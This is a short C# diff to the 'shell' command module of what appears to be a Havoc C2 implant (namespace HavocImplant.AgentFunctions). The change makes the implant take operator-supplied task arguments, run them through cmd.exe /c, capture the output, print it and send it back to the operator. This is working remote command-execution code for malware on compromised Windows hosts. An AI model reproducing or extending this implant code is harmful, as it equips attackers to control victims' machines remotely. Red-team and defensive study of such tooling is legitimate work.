@@ -15,13 +15,12 @@ namespace HavocImplant.AgentFunctions
         public override string Command => "shell";
         public override bool Dangerous => false;
 
-        public override void Run(string command, int taskId)
+        public override void Run(int taskId)
         {
             Output = "";
-            //Console.WriteLine("Running cmd.exe /c " + command);
             Process process = new Process();
             process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.Arguments = "/c " + command;
+            process.StartInfo.Arguments = "/c " + Agent.taskingInformation[taskId].taskArguments;
             process.StartInfo.UseShellExecute = false;
             process.StartInfo.RedirectStandardOutput = true;
             process.StartInfo.RedirectStandardError = true;
@@ -32,7 +31,8 @@ namespace HavocImplant.AgentFunctions
             process.BeginOutputReadLine();
             
             process.WaitForExit();
-            ReturnOutput(taskId);
+            Console.WriteLine($"Output is {Output}");
+;           ReturnOutput(taskId);
 
          }
     }
